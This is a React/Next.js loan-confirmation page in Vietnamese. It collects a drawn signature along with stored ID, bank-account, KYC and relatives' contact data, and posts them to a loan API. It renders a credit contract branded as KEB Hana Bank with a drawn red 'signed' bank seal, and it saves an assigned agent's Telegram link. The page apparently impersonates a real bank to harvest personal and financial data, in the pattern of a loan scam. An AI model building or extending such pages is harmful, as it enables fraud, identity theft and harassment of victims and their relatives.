import Link from 'next/link';
import CustomerFooter from '../components/CustomerFooter';
import MobileBottomNav from '../components/MobileBottomNav';
import { useRouter } from 'next/router';
import { useEffect, useRef, useState } from 'react';
import { ArrowLeft, CheckCircle2, FileText, RotateCcw, X } from 'lucide-react';
import { useToast } from '@/components/ui/toast';

export default function ConfirmLoanPage() {
  const router = useRouter();
  const { showToast } = useToast();
  const [contract, setContract] = useState(false);
  const [signed, setSigned] = useState(false);
  const [signature, setSignature] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [amount, setAmount] = useState<number>(0);
  const [termMonths, setTermMonths] = useState<number>(0);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const drawing = useRef(false);

  useEffect(() => {
    setAmount(Number(window.localStorage.getItem('loanAmount') || 10000000));
    setTermMonths(Number(window.localStorage.getItem('loanTerm') || 60));
  }, []);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ratio = window.devicePixelRatio || 1;
    const rect = canvas.getBoundingClientRect();
    canvas.width = Math.floor(rect.width * ratio);
    canvas.height = Math.floor(rect.height * ratio);
    const ctx = canvas.getContext('2d');
    if (!ctx) return;
    ctx.scale(ratio, ratio);
    ctx.lineWidth = 2.8;
    ctx.lineCap = 'round';
    ctx.lineJoin = 'round';
    ctx.strokeStyle = '#0f172a';
  }, []);

  const point = (e: React.PointerEvent<HTMLCanvasElement>) => {
    const rect = e.currentTarget.getBoundingClientRect();
    return { x: e.clientX - rect.left, y: e.clientY - rect.top };
  };

  const syncSignature = () => {
    const data = canvasRef.current?.toDataURL('image/png') || '';
    setSignature(data);
  };

  const start = (e: React.PointerEvent<HTMLCanvasElement>) => {
    e.currentTarget.setPointerCapture(e.pointerId);
    drawing.current = true;
    const p = point(e);
    const ctx = e.currentTarget.getContext('2d');
    ctx?.beginPath();
    ctx?.moveTo(p.x, p.y);
  };

  const move = (e: React.PointerEvent<HTMLCanvasElement>) => {
    if (!drawing.current) return;
    const p = point(e);
    const ctx = e.currentTarget.getContext('2d');
    ctx?.lineTo(p.x, p.y);
    ctx?.stroke();
    setSigned(true);
    syncSignature();
  };

  const stop = () => {
    if (!drawing.current) return;
    drawing.current = false;
    syncSignature();
  };

  const clear = () => {
    const canvas = canvasRef.current;
    const ctx = canvas?.getContext('2d');
    if (canvas && ctx) ctx.clearRect(0, 0, canvas.width, canvas.height);
    setSigned(false);
    setSignature('');
  };

  const finish = async () => {
    if (submitting) return;
    if (!signed || !signature) return showToast('Vui lòng ký tay trước khi hoàn tất');
    setSubmitting(true);
    try {
      const amount = Number(window.localStorage.getItem('loanAmount') || 10000000);
      const termMonths = Number(window.localStorage.getItem('loanTerm') || 60);
      const res = await fetch('/api/loans', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount, termMonths, interestRate: 1, profile: readJson('loanProfile'), bank: readJson('loanBank'), kyc: readJson('loanKyc'), signatureImage: signature }),
      });
      const json = await res.json();
      if (!json.ok) return showToast(json.error || 'Không thể gửi hồ sơ vay');
      window.localStorage.setItem('loanSubmitted', '1');
      window.localStorage.setItem('latestLoanId', json.data.id);
      if (json.data.assignedAgent?.telegramLink) window.localStorage.setItem('assignedSaleTelegram', json.data.assignedAgent.telegramLink);
      router.push('/loan-success');
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <main className="min-h-screen bg-slate-100 text-[#333]">
      <div className="relative mx-auto min-h-screen w-full max-w-[390px] bg-white pb-[82px] shadow-sm">
        <header className="relative flex h-[50px] items-center justify-center bg-[#2AAD69] text-white">
          <Link href="/bank-info" className="absolute left-4 rounded-full p-1 active:bg-white/10" aria-label="Quay lại">
            <ArrowLeft className="h-7 w-7" />
          </Link>
          <h1 className="text-[21px] font-bold">Xác nhận vay</h1>
        </header>

        <section className="px-6 pt-7 text-[16px]">
          <h2 className="text-center text-[18px] font-bold">Xác nhận khoản vay</h2>

          <div className="mt-6 rounded-2xl border border-blue-100 bg-blue-50 p-4 leading-8 shadow-sm">
            <p>Khoản tiền vay: <b className="text-[20px] text-[#2AAD69]">{new Intl.NumberFormat('ko-KR').format(amount)}</b> KRW</p>
            <p>Thời hạn thanh toán: <b className="text-[20px] text-[#2AAD69]">{termMonths} tháng</b></p>
            <p className="text-[13px] text-slate-500">Lãi suất tham khảo: 1%/tháng</p>
          </div>

          <button onClick={() => setContract(true)} className="mt-4 flex h-11 w-full items-center justify-center gap-2 rounded-full bg-[#ff7426] text-[16px] font-bold text-white shadow-md transition active:scale-95">
            <FileText className="h-5 w-5" /> Xem hợp đồng trước khi ký
          </button>

          <div className="mt-6 rounded-3xl border border-slate-200 bg-white p-4 shadow-sm">
            <div className="flex items-center justify-between gap-3">
              <div>
                <div className="text-[15px] font-bold">Ký tay vào khung</div>
                <div className="text-[12px] text-slate-500">Chữ ký sẽ được đặt trực tiếp vào hợp đồng.</div>
              </div>
              {signed ? <span className="flex items-center gap-1 rounded-full bg-emerald-50 px-3 py-1 text-[12px] font-bold text-emerald-600"><CheckCircle2 className="h-4 w-4" /> Đã ký</span> : <span className="rounded-full bg-amber-50 px-3 py-1 text-[12px] font-bold text-amber-600">Chưa ký</span>}
            </div>

            <canvas
              ref={canvasRef}
              onPointerDown={start}
              onPointerMove={move}
              onPointerUp={stop}
              onPointerCancel={stop}
              onPointerLeave={stop}
              className="mt-3 h-[178px] w-full touch-none rounded-2xl border-2 border-dashed border-slate-300 bg-[linear-gradient(#fff,#fff),repeating-linear-gradient(0deg,transparent,transparent_36px,#f1f5f9_37px)] shadow-inner"
            />
            <div className="mt-2 flex items-center justify-between">
              <button onClick={clear} className="flex items-center gap-1 text-[13px] font-bold text-[#2AAD69] underline"><RotateCcw className="h-4 w-4" /> Ký lại</button>
              <button onClick={() => setContract(true)} className="text-[13px] font-bold text-slate-600 underline">Xem chữ ký trên hợp đồng</button>
            </div>
          </div>

          <div className="mt-8 flex justify-center">
            <button disabled={submitting} onClick={finish} className="flex h-[46px] w-[190px] items-center justify-center rounded-full bg-[#2AAD69] font-bold text-white shadow-[0_10px_22px_rgba(20,30,210,0.25)] transition active:scale-95 disabled:opacity-60">
              {submitting ? 'Đang gửi...' : 'Hoàn tất ký hợp đồng'}
            </button>
          </div>
        </section>

        <MobileBottomNav active="plus" />
        {contract && <ContractModal onClose={() => setContract(false)} signature={signature} />}
        <CustomerFooter />
      </div>
    </main>
  );
}

function readJson(key: string) {
  try { return JSON.parse(window.localStorage.getItem(key) || 'null'); } catch { return null; }
}

function ContractModal({ onClose, signature }: { onClose: () => void; signature: string }) {
  const profile = typeof window !== 'undefined' ? readJson('loanProfile') : null;
  const bank = typeof window !== 'undefined' ? readJson('loanBank') : null;
  const bankName = bank?.bankName || bank?.bank || bank?.name || bank?.receiveBank || '';
  const bankAccount = bank?.accountNumber || bank?.accountNo || bank?.bankAccount || bank?.account || '';
  const bankOwner = bank?.accountName || bank?.ownerName || bank?.holderName || bank?.nameOnAccount || '';
  const amount = typeof window !== 'undefined' ? Number(window.localStorage.getItem('loanAmount') || 10000000) : 10000000;
  const term = typeof window !== 'undefined' ? Number(window.localStorage.getItem('loanTerm') || 60) : 60;
  const customerName = profile?.fullName || profile?.name || 'Khách hàng';
  const customerPhone = profile?.phone || (typeof window !== 'undefined' ? window.localStorage.getItem('phone') : '') || '';
  const customerCitizenId = profile?.citizenId || profile?.id || '';
  const today = new Date().toLocaleDateString('ko-KR');
  const contractNo = `MBV-${Date.now().toString().slice(-8)}`;

  return (
    <div className="absolute inset-0 z-30 bg-slate-200">
      <button onClick={onClose} className="fixed right-3 top-3 z-10 rounded-full bg-white p-2 text-[#777] shadow active:bg-slate-100" aria-label="Đóng">
        <X />
      </button>
      <div className="h-full overflow-auto px-4 pb-24 pt-8 text-[14px] leading-6">
        <article className="relative mx-auto overflow-hidden rounded-sm bg-white p-5 text-slate-950 shadow-xl">
          <img src="/logo.png" alt="" aria-hidden="true" className="pointer-events-none absolute left-1/2 top-1/2 w-[270px] -translate-x-1/2 -translate-y-1/2 rotate-[-28deg] opacity-[0.055]" />

          <header className="relative pb-4">
            <div className="flex items-start justify-between gap-4">
              <div className="flex items-center gap-2">
                <img src="/logo.png" alt="KEB Hana Bank" className="h-10 w-auto object-contain" />
              </div>
              <div className="p-2 text-right text-[10px] leading-5">
                <div><b>Số hợp đồng:</b> {contractNo}</div>
                <div><b>Ngày ký:</b> {today}</div>
              </div>
            </div>
          </header>

          <section className="relative mt-5 text-center">
            <h1 className="text-[12px] font-black">CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM<br />Độc lập - Tự do - Hạnh phúc</h1>
            <h2 className="mt-5 text-[18px] font-black uppercase">Hợp đồng tín dụng kiêm xác nhận giải ngân</h2>
            <p className="mt-1 text-[11px] text-slate-500">Áp dụng cho khoản vay đăng ký qua hệ thống điện tử</p>
          </section>

          <Section title="I. Thông tin các bên">
            <div className="p-3">
              <Row label="Bên cho vay" value="KEB Hana Bank - khối dịch vụ tín dụng số" />
              <Row label="Đại diện" value="Bộ phận phê duyệt khoản vay trực tuyến" />
              <Row label="Bên vay" value={customerName} />
              <Row label="CCCD" value={customerCitizenId || '...............'} />
              <Row label="SĐT" value={customerPhone || '...............'} />
              <Row label="Tên người thân" value={profile?.emergencyName || profile?.relativeName || '...............'} />
              <Row label="Số điện thoại người thân" value={profile?.emergencyPhone || profile?.relativePhone || '...............'} />
              <Row label="Quan hệ" value={profile?.emergencyRelation || profile?.relation || '...............'} />
            </div>
          </Section>

          <Section title="II. Thông tin khoản vay">
            <div className="p-3">
              <Row label="Số tiền vay" value={`${money(amount)} KRW`} strong />
              <Row label="Thời hạn vay" value={`${term} tháng`} />
              <Row label="Lãi suất" value="1%/tháng" />
              <Row label="Ngày tạo hồ sơ" value={today} />
              <Row label="Trạng thái" value="Đã gửi" />
            </div>
          </Section>

          <Section title="III. Thông tin giải ngân">
            <div className="p-3">
              <Row label="Ngân hàng nhận" value={bankName || '...............'} />
              <Row label="Số tài khoản" value={bankAccount || '...............'} />
              <Row label="Chủ tài khoản" value={bankOwner || customerName} />
            </div>
          </Section>

          <Section title="IV. Điều khoản xác nhận">
            <div className="relative space-y-2 text-justify">
              <p>Bên vay xác nhận đã đọc, hiểu và đồng ý toàn bộ nội dung hợp đồng tín dụng này, bao gồm số tiền vay, thời hạn vay, lãi suất, phí phát sinh nếu có, phương thức giải ngân, phương thức thu nợ và nghĩa vụ thanh toán đúng hạn.</p>
              <p>Bên vay cam kết thông tin cá nhân, số CCCD, số điện thoại, thông tin tài khoản nhận tiền và thông tin người thân liên hệ là chính xác.</p>
              <p>Bên vay đồng ý sử dụng chữ ký điện tử/ảnh chữ ký tay được ghi nhận trên hệ thống để xác nhận hợp đồng.</p>
            </div>
          </Section>

          <div className="relative mt-8 grid grid-cols-2 gap-4 text-center">
            <div className="min-h-[150px] p-3">
              <div className="font-black uppercase">Bên vay</div>
              <div className="mt-1 text-[11px] text-slate-500">Ký và ghi rõ họ tên</div>
              {signature ? <img src={signature} alt="Chữ ký người vay" className="mx-auto mt-2 h-20 w-full object-contain" /> : <div className="mt-8 text-[12px] text-slate-400">Chưa có chữ ký</div>}
              <div className="mt-2 font-bold">{customerName}</div>
            </div>
            <div className="min-h-[150px] p-3">
              <div className="font-black uppercase">Đại diện KEB Hana Bank</div>
              <div className="text-[11px] text-slate-500">Xác nhận hệ thống</div>
              <div className="relative mx-auto mt-2 h-32 w-36">
                <svg viewBox="0 0 180 180" className="absolute left-1/2 top-0 h-28 w-28 -translate-x-1/2 rotate-[-8deg] opacity-95">
                  <defs>
                    <path id="sealTop" d="M 32 92 A 58 58 0 0 1 148 92" />
                    <path id="sealBottom" d="M 148 98 A 58 58 0 0 1 32 98" />
                  </defs>
                  <circle cx="90" cy="90" r="76" fill="none" stroke="#dc2626" strokeWidth="5" />
                  <circle cx="90" cy="90" r="62" fill="none" stroke="#dc2626" strokeWidth="2.5" />
                  <text fontSize="11" fontWeight="900" fill="#dc2626" letterSpacing="1.1">
                    <textPath href="#sealTop" startOffset="50%" textAnchor="middle">NGÂN HÀNG KEB HANA</textPath>
                  </text>
                  <text fontSize="10" fontWeight="800" fill="#dc2626" letterSpacing="0.9">
                    <textPath href="#sealBottom" startOffset="50%" textAnchor="middle">XÁC NHẬN ĐIỆN TỬ</textPath>
                  </text>
                  <text x="90" y="82" textAnchor="middle" fontSize="32" fontWeight="900" fill="#dc2626">★</text>
                  <text x="90" y="108" textAnchor="middle" fontSize="17" fontWeight="900" fill="#dc2626">ĐÃ KÝ</text>
                </svg>
              </div>
            </div>
          </div>
        </article>
        <div className="mt-4 flex justify-end">
          <button onClick={onClose} className="h-10 rounded-lg bg-[#1e9af0] px-5 text-white">OK</button>
        </div>
      </div>
    </div>
  );
}

function Section({ title, children }: any) { return <section className="mt-5"><h3 className="mb-2 font-black text-blue-800">{title}</h3><div className="space-y-1">{children}</div></section>; }
function Row({ label, value, strong }: any) { return <div className="flex gap-2 border-b border-slate-100 py-1.5 last:border-b-0"><b className="w-[96px] shrink-0">{label}</b><span className={(strong ? 'font-black text-blue-700 ' : '') + 'min-w-0 flex-1 break-words text-right'}>{value}</span></div>; }
function money(v: number) { return new Intl.NumberFormat('ko-KR').format(Number(v || 0)); }
